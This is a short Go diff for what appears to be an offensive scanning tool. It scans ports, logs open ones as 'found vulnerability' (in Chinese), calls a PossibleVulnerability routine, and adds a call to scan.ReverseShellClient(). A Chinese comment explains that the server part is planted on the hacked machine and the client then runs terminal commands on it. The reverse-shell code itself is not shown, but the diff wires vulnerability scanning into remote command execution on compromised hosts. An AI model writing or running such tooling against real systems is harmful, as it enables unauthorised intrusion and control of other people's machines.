@@ -22,7 +22,7 @@ func main() {
 	// port_str := "3306,3308"
 	// port_str := "3306|3308"
 	var ports []int
-	var openPort []int
+	//var openPort []int
 	var err error
 	var isopen bool
 	s := scan.NewScan(ip, port_str)
@@ -43,8 +43,8 @@ func main() {
 			} else {
 				if isopen {
 					logger.Info("找到漏洞", log.Int("port", ports[i]), log.Bool("open", isopen))
-					s.PossibleVulnerability(ports[i], logger)
-					openPort = append(openPort, ports[i])
+					//s.PossibleVulnerability(ports[i], logger)
+					//openPort = append(openPort, ports[i])
 				}
 			}
 		}
@@ -60,9 +60,16 @@ func main() {
 		port := <-results
 		if port != 0 {
 			logger.Info("找到漏洞", log.Int("port", port))
+			s.PossibleVulnerability(port, logger)
 		}
 	}
 
 	//分析開啟的Ports決定要不要試著攻擊
-	
+
+	//黑客攻擊技巧-反向shell
+	/*
+		Server端要獨立放在被駭的機器上, 再啟動Client執行終端機指令
+	*/
+	scan.ReverseShellClient()
+
 }
